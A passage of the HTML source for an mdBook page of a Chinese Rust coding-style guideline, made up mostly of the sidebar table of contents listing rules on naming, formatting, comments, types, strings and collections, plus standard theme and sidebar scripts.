<!DOCTYPE HTML>
<html lang="zh" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Rust 编码规范 V 1.0 beta</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item "><a href="overview.html"><strong aria-hidden="true">1.</strong> 概述</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/overview/why.html"><strong aria-hidden="true">1.1.</strong> 为什么需要 Rust 编码规范</a></li><li class="chapter-item "><a href="safe-guides/overview/convention.html"><strong aria-hidden="true">1.2.</strong> 编码规范基本约定</a></li></ol></li><li class="chapter-item "><a href="safe-guides/code_style.html"><strong aria-hidden="true">2.</strong> 代码风格</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/code_style/naming.html"><strong aria-hidden="true">2.1.</strong> 命名</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.01.html"><strong aria-hidden="true">2.1.1.</strong> P.NAM.01 同一个crate中标识符的命名规则应该使用统一的词序</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.02.html"><strong aria-hidden="true">2.1.2.</strong> P.NAM.02 为 cargo feature 命名时不应含有无意义的占位词</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.03.html"><strong aria-hidden="true">2.1.3.</strong> P.NAM.03 标识符命名应该符合阅读习惯</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.04.html"><strong aria-hidden="true">2.1.4.</strong> P.NAM.04 作用域越大命名越精确，反之应简短</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.05.html"><strong aria-hidden="true">2.1.5.</strong> P.NAM.05 用于访问或获取数据的 getter 类方法通常不要使用 get_ 前缀</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.06.html"><strong aria-hidden="true">2.1.6.</strong> P.NAM.06 遵循 iter/ iter_mut/ into_iter 规范来生成迭代器</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.07.html"><strong aria-hidden="true">2.1.7.</strong> P.NAM.07 避免使用语言内置保留字、关键字、内置类型和trait等特殊名称</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.08.html"><strong aria-hidden="true">2.1.8.</strong> P.NAM.08 避免在变量的命名中添加类型标识</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/P.NAM.09.html"><strong aria-hidden="true">2.1.9.</strong> P.NAM.09 定义全局静态变量时需加前缀G_以便和常量有所区分</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/G.NAM.01.html"><strong aria-hidden="true">2.1.10.</strong> G.NAM.01 使用统一的命名风格</a></li><li class="chapter-item "><a href="safe-guides/code_style/naming/G.NAM.02.html"><strong aria-hidden="true">2.1.11.</strong> G.NAM.02 类型转换函数命名需要遵循所有权语义</a></li></ol></li><li class="chapter-item "><a href="safe-guides/code_style/fmt.html"><strong aria-hidden="true">2.2.</strong> 格式</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.01.html"><strong aria-hidden="true">2.2.1.</strong> P.FMT.01 使用 rustfmt 进行自动格式化代码</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.02.html"><strong aria-hidden="true">2.2.2.</strong> P.FMT.02 缩进使用空格而非制表符</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.03.html"><strong aria-hidden="true">2.2.3.</strong> P.FMT.03 行间距最大宽度空一行</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.04.html"><strong aria-hidden="true">2.2.4.</strong> P.FMT.04 语言项（Item) 定义时左花括号（brace）位置应该与语言项保持同一行</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.05.html"><strong aria-hidden="true">2.2.5.</strong> P.FMT.05 存在多个标识符时应该保持块状（Block）缩进</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.06.html"><strong aria-hidden="true">2.2.6.</strong> P.FMT.06 当有多行表达式操作时，操作符应该置于行首</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.07.html"><strong aria-hidden="true">2.2.7.</strong> P.FMT.07 枚举变体和结构体字段都应左对齐</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.08.html"><strong aria-hidden="true">2.2.8.</strong> P.FMT.08 函数参数超过五个或导入模块个数超过四个需换行</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.09.html"><strong aria-hidden="true">2.2.9.</strong> P.FMT.09 不同的场景，使用不同的空格风格</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.10.html"><strong aria-hidden="true">2.2.10.</strong> P.FMT.10 match 分支应该具有良好的可读性</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.11.html"><strong aria-hidden="true">2.2.11.</strong> P.FMT.11 导入模块分组应该具有良好的可读性</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.12.html"><strong aria-hidden="true">2.2.12.</strong> P.FMT.12 声明宏分支应该具有良好的可读性</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.13.html"><strong aria-hidden="true">2.2.13.</strong> P.FMT.13 具名结构体字段初始化时不要省略字段名</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.14.html"><strong aria-hidden="true">2.2.14.</strong> P.FMT.14 extern 外部函数需要显式指定 C-ABI</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.15.html"><strong aria-hidden="true">2.2.15.</strong> P.FMT.15 解构元组的时候允许使用..来指代剩余元素</a></li><li class="chapter-item "><a href="safe-guides/code_style/fmt/P.FMT.16.html"><strong aria-hidden="true">2.2.16.</strong> P.FMT.16 不要将派生宏中多个不相关的特质合并为同一行</a></li></ol></li><li class="chapter-item "><a href="safe-guides/code_style/comments.html"><strong aria-hidden="true">2.3.</strong> 注释</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/code_style/comments/P.CMT.01.html"><strong aria-hidden="true">2.3.1.</strong> P.CMT.01 代码能做到自注释，文档要干练简洁</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/P.CMT.02.html"><strong aria-hidden="true">2.3.2.</strong> P.CMT.02 注释应该有宽度限制</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/P.CMT.03.html"><strong aria-hidden="true">2.3.3.</strong> P.CMT.03 使用行注释而避免使用块注释</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/P.CMT.04.html"><strong aria-hidden="true">2.3.4.</strong> P.CMT.04 文件头注释包含版权说明</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/P.CMT.05.html"><strong aria-hidden="true">2.3.5.</strong> P.CMT.05 在注释中使用 FIXME 和 TODO 来帮助任务协作</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/G.CMT.01.html"><strong aria-hidden="true">2.3.6.</strong> G.CMT.01 在公开的返回Result类型的函数文档中增加 Error 注释</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/G.CMT.02.html"><strong aria-hidden="true">2.3.7.</strong> G.CMT.02 如果公开的API在某些情况下会发生Panic，则相应文档中需增加 Panic 注释</a></li><li class="chapter-item "><a href="safe-guides/code_style/comments/G.CMT.03.html"><strong aria-hidden="true">2.3.8.</strong> G.CMT.03 在文档注释中要使用空格代替 tab</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice.html"><strong aria-hidden="true">3.</strong> 编码实践</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/consts.html"><strong aria-hidden="true">3.1.</strong> 常量</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/consts/G.CNS.01.html"><strong aria-hidden="true">3.1.1.</strong> G.CNS.01 对于科学计算中涉及浮点数近似值的常量宜使用预定义常量</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/consts/G.CNS.02.html"><strong aria-hidden="true">3.1.2.</strong> G.CNS.02 不应断言常量布尔类型</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/consts/G.CNS.03.html"><strong aria-hidden="true">3.1.3.</strong> G.CNS.03 不应将内部可变性容器声明为常量</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/consts/G.CNS.04.html"><strong aria-hidden="true">3.1.4.</strong> G.CNS.04 不应在常量定义中增加显式的 'static 生命周期</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/consts/G.CNS.05.html"><strong aria-hidden="true">3.1.5.</strong> G.CNS.05 对于适用 const fn 的函数或方法宜尽可能地使用 const fn</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/statics.html"><strong aria-hidden="true">3.2.</strong> 静态变量</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/statics/G.STV.01.html"><strong aria-hidden="true">3.2.1.</strong> G.STV.01 不宜直接使用可变静态变量作为全局变量</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables.html"><strong aria-hidden="true">3.3.</strong> 本地变量</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/variables/P.VAR.01.html"><strong aria-hidden="true">3.3.1.</strong> P.VAR.01 一般情况下避免先声明可变变量再赋值</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables/P.VAR.02.html"><strong aria-hidden="true">3.3.2.</strong> P.VAR.02 利用变量遮蔽功能保证变量安全使用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables/G.VAR.01.html"><strong aria-hidden="true">3.3.3.</strong> G.VAR.01 以解构元组方式定义超过四个变量时不应使用太多无意义变量名</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables/G.VAR.02.html"><strong aria-hidden="true">3.3.4.</strong> G.VAR.02 不应使用非 ASCII 字符作为标识符</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables/G.VAR.03.html"><strong aria-hidden="true">3.3.5.</strong> G.VAR.03 变量遮蔽功能应当合理使用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/variables/G.VAR.04.html"><strong aria-hidden="true">3.3.6.</strong> G.VAR.04 避免因局部变量过大而导致的大量栈分配</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type.html"><strong aria-hidden="true">3.4.</strong> 数据类型</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/P.TYP.01.html"><strong aria-hidden="true">3.4.1.</strong> P.TYP.01 必要时，应使类型可以表达更明确的语义，而不是只是直接使用原生类型</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/G.TYP.01.html"><strong aria-hidden="true">3.4.2.</strong> G.TYP.01 类型转换尽可能使用安全的转换函数代替 as</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/G.TYP.02.html"><strong aria-hidden="true">3.4.3.</strong> G.TYP.02 数字字面量在使用的时候应该明确标注类型</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/G.TYP.03.html"><strong aria-hidden="true">3.4.4.</strong> G.TYP.03 不要用数字类型边界值判断能否安全转换，而应使用 try_from 方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool.html"><strong aria-hidden="true">3.4.5.</strong> 布尔</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.01.html"><strong aria-hidden="true">3.4.5.1.</strong> G.TYP.BOL.01 不应将布尔值和布尔字面量进行比较</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.02.html"><strong aria-hidden="true">3.4.5.2.</strong> G.TYP.BOL.02 如果 match 匹配表达式为布尔类型，宜使用 if 表达式来代替</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.03.html"><strong aria-hidden="true">3.4.5.3.</strong> G.TYP.BOL.03 不应将数字类型转换为布尔值</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.04.html"><strong aria-hidden="true">3.4.5.4.</strong> G.TYP.BOL.04 禁止在if表达式条件中使用块结构</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.05.html"><strong aria-hidden="true">3.4.5.5.</strong> G.TYP.BOL.05 非必要时，布尔运算应使用逻辑运算符( &amp;&amp;/||)而非位运算符 (&amp;/|)</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.06.html"><strong aria-hidden="true">3.4.5.6.</strong> G.TYP.BOL.06 不应使用数字代替布尔值</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/bool/G.TYP.BOL.07.html"><strong aria-hidden="true">3.4.5.7.</strong> G.TYP.BOL.07 使用 .not() 方法代替逻辑取反运算符 (!)</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/char.html"><strong aria-hidden="true">3.4.6.</strong> 字符</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/char/G.TYP.CHR.01.html"><strong aria-hidden="true">3.4.6.1.</strong> G.TYP.CHR.01 不应将字符字面量强制转换为 u8</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/char/G.TYP.CHR.02.html"><strong aria-hidden="true">3.4.6.2.</strong> G.TYP.CHR.02 字符串方法中如果需要单个字符的值作为参数，宜使用字符而非字符串</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/char/G.TYP.CHR.03.html"><strong aria-hidden="true">3.4.6.3.</strong> G.TYP.CHR.03 需要将整数转换为字符时，应使用安全转换函数，而非 transmute</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/int.html"><strong aria-hidden="true">3.4.7.</strong> 整数</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/int/G.TYP.INT.01.html"><strong aria-hidden="true">3.4.7.1.</strong> G.TYP.INT.01 在用整数计算的时候需要考虑整数溢出、回绕和截断的风险</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/int/G.TYP.INT.02.html"><strong aria-hidden="true">3.4.7.2.</strong> G.TYP.INT.02 避免在有符号整数和无符号整数之间进行强制转换</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/int/G.TYP.INT.03.html"><strong aria-hidden="true">3.4.7.3.</strong> G.TYP.INT.03 对负数取模计算的时候不应使用 %</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float.html"><strong aria-hidden="true">3.4.8.</strong> 浮点数</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float/G.TYP.FLT.01.html"><strong aria-hidden="true">3.4.8.1.</strong> G.TYP.FLT.01 使用浮点数字面量时，要警惕是否存在被Rust编译器截断的风险</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float/G.TYP.FLT.02.html"><strong aria-hidden="true">3.4.8.2.</strong> G.TYP.FLT.02 从任何数字类型转换为浮点类型时注意避免损失精度</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float/G.TYP.FLT.03.html"><strong aria-hidden="true">3.4.8.3.</strong> G.TYP.FLT.03 对精度高要求的场景下，使用浮点数进行运算和比较时需要注意精度损失</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float/G.TYP.FLT.04.html"><strong aria-hidden="true">3.4.8.4.</strong> G.TYP.FLT.04 宜使用Rust内置方法处理浮点数计算</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/float/G.TYP.FLT.05.html"><strong aria-hidden="true">3.4.8.5.</strong> G.TYP.FLT.05 禁止在浮点数和整数相互转换时使用 transmute</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/slice.html"><strong aria-hidden="true">3.4.9.</strong> 切片</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/slice/P.TYP.SLC.01.html"><strong aria-hidden="true">3.4.9.1.</strong> P.TYP.SLC.01 宜使用切片迭代器来代替手工索引</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/slice/P.TYP.SLC.02.html"><strong aria-hidden="true">3.4.9.2.</strong> P.TYP.SLC.02 宜使用切片模式来提升代码的可读性</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/tuple.html"><strong aria-hidden="true">3.4.10.</strong> 元组</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/tuple/G.TYP.TUP.01.html"><strong aria-hidden="true">3.4.10.1.</strong> G.TYP.TUP.01 使用元组时，其元素不宜超过3个</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/array.html"><strong aria-hidden="true">3.4.11.</strong> 固定长度数组</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/array/G.TYP.ARR.01.html"><strong aria-hidden="true">3.4.11.1.</strong> G.TYP.ARR.01 创建大全局数组时宜使用静态变量而非常量</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/array/G.TYP.ARR.02.html"><strong aria-hidden="true">3.4.11.2.</strong> G.TYP.ARR.02 使用数组索引时禁止越界访问</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/array/G.TYP.ARR.03.html"><strong aria-hidden="true">3.4.11.3.</strong> G.TYP.ARR.03 当数组元素为原生数据类型（Primitive），排序时优先选用非稳定排序</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/vec.html"><strong aria-hidden="true">3.4.12.</strong> 动态数组</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/vec/P.TYP.VEC.01.html"><strong aria-hidden="true">3.4.12.1.</strong> P.TYP.VEC.01 非必要时不宜使用动态数组</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/vec/P.TYP.VEC.02.html"><strong aria-hidden="true">3.4.12.2.</strong> P.TYP.VEC.02 创建动态数组时，宜预先分配足够容量，避免后续操作中产生多次分配</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/vec/G.TYP.VEC.01.html"><strong aria-hidden="true">3.4.12.3.</strong> G.TYP.VEC.01 禁止访问未初始化的数组</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct.html"><strong aria-hidden="true">3.4.13.</strong> 结构体</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct/P.TYP.SCT.01.html"><strong aria-hidden="true">3.4.13.1.</strong> P.TYP.SCT.01 为结构体实现构造性方法时，避免构造后再初始化的情况</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct/P.TYP.SCT.02.html"><strong aria-hidden="true">3.4.13.2.</strong> P.TYP.SCT.02 结构体实例需要默认实现时，宜使用Default特质</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct/G.TYP.SCT.01.html"><strong aria-hidden="true">3.4.13.3.</strong> G.TYP.SCT.01 对外导出的公开的 Struct，宜添加#[non_exhaustive]属性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct/G.TYP.SCT.02.html"><strong aria-hidden="true">3.4.13.4.</strong> G.TYP.SCT.02 当结构体中有超过三个布尔类型的字段，宜将其独立为新的枚举类</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/struct/G.TYP.SCT.03.html"><strong aria-hidden="true">3.4.13.5.</strong> G.TYP.SCT.03 宜使用结构体功能更新语法来提升代码可读性</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum.html"><strong aria-hidden="true">3.4.14.</strong> 枚举体</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.01.html"><strong aria-hidden="true">3.4.14.1.</strong> G.TYP.ENM.01 合理使用map和and_then方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.02.html"><strong aria-hidden="true">3.4.14.2.</strong> G.TYP.ENM.02 不应自行创建空枚举</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.03.html"><strong aria-hidden="true">3.4.14.3.</strong> G.TYP.ENM.03 在使用类似 C 语言的枚举写法且使用repr(isize/usize) 布局时注意 32位架构上截断的问题</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.04.html"><strong aria-hidden="true">3.4.14.4.</strong> G.TYP.ENM.04 不宜在use语句中引入Enum的全部变体（variants）</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.05.html"><strong aria-hidden="true">3.4.14.5.</strong> G.TYP.ENM.05 对外导出的公开Enum，宜添加#[non_exhaustive]属性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.06.html"><strong aria-hidden="true">3.4.14.6.</strong> G.TYP.ENM.06 Enum内变体的大小差异不宜过大</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/data-type/enum/G.TYP.ENM.07.html"><strong aria-hidden="true">3.4.14.7.</strong> G.TYP.ENM.07 如需依赖 Enum 中变体的序数，则应显示为变体设置明确的数值</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr.html"><strong aria-hidden="true">3.5.</strong> 表达式</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.01.html"><strong aria-hidden="true">3.5.1.</strong> G.EXP.01 当需要对表达式求值后重新赋值时，宜使用复合赋值模式</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.02.html"><strong aria-hidden="true">3.5.2.</strong> G.EXP.02 不宜在比较中使用不兼容的位掩码</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.03.html"><strong aria-hidden="true">3.5.3.</strong> G.EXP.03 不应利用数组表达式的边界检查来 Panic，而应使用断言</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.04.html"><strong aria-hidden="true">3.5.4.</strong> G.EXP.04 自增或自减运算使用+=或-=</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.05.html"><strong aria-hidden="true">3.5.5.</strong> G.EXP.05 使用括号来清楚表示表达式的计算顺序</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/expr/G.EXP.06.html"><strong aria-hidden="true">3.5.6.</strong> G.EXP.06 避免在比较中添加无用的掩码操作</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow.html"><strong aria-hidden="true">3.6.</strong> 控制流程</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/P.CTF.01.html"><strong aria-hidden="true">3.6.1.</strong> P.CTF.01 避免滥用迭代器</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/P.CTF.02.html"><strong aria-hidden="true">3.6.2.</strong> P.CTF.02 优先使用模式匹配而非判断后再取值</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/G.CTF.01.html"><strong aria-hidden="true">3.6.3.</strong> G.CTF.01 当需要通过多个if判断来比较大小来区分不同情况时，优先使用match和cmp来代替if表达式</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/G.CTF.02.html"><strong aria-hidden="true">3.6.4.</strong> G.CTF.02 if条件表达式分支中如果包含了else if分支也应该包含else分支</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/G.CTF.03.html"><strong aria-hidden="true">3.6.5.</strong> G.CTF.03 如果要通过 if 条件表达式来判断是否 Panic，请优先使用断言</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/control-flow/G.CTF.04.html"><strong aria-hidden="true">3.6.6.</strong> G.CTF.04 在 Match 分支的 Guard 语句中不要使用带有副作用的条件表达式</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings.html"><strong aria-hidden="true">3.7.</strong> 字符串</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/strings/P.STR.01.html"><strong aria-hidden="true">3.7.1.</strong> P.STR.01 处理字符串元素时优先按字节处理而非字符</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/P.STR.02.html"><strong aria-hidden="true">3.7.2.</strong> P.STR.02 创建字符串时，宜预先分配大约足够的容量来避免后续操作中产生多次分配</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/P.STR.03.html"><strong aria-hidden="true">3.7.3.</strong> P.STR.03 在使用内建字符串处理函数或方法的时候，应注意避免隐藏的嵌套迭代或多次迭代</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/P.STR.04.html"><strong aria-hidden="true">3.7.4.</strong> P.STR.04 在使用 Cow&lt;'a, B&gt; 时要注意选择合理场景以便最大化地优化性能</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/P.STR.05.html"><strong aria-hidden="true">3.7.5.</strong> P.STR.05 在拼接字符串时，优先使用format!</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/G.STR.01.html"><strong aria-hidden="true">3.7.6.</strong> G.STR.01 在实现Display特质时不应调用to_string()方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/G.STR.02.html"><strong aria-hidden="true">3.7.7.</strong> G.STR.02 在追加字符串时使用push_str方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/G.STR.03.html"><strong aria-hidden="true">3.7.8.</strong> G.STR.03 将只包含 ASCII字符的字符串字面量转为字节序列可以直接使用b&quot;str&quot; 语法代替调用as_bytes方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/G.STR.04.html"><strong aria-hidden="true">3.7.9.</strong> G.STR.04 需要辨别字符串的字符开头或结尾字符时，不应按字符迭代比较</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/strings/G.STR.05.html"><strong aria-hidden="true">3.7.10.</strong> G.STR.05 对字符串按指定位置进行切片的时候需要小心破坏其 UTF-8 编码</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/collections.html"><strong aria-hidden="true">3.8.</strong> 集合容器</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/collections/P.CLT.01.html"><strong aria-hidden="true">3.8.1.</strong> P.CLT.01 创建HashMap、VecDeque时，可以预先分配大约足够的容量来避免后续操作中产生多次分配</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/collections/G.CLT.01.html"><strong aria-hidden="true">3.8.2.</strong> G.CLT.01 非必要情况下，不要使用LinkedList，而用Vec或VecDeque代替</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design.html"><strong 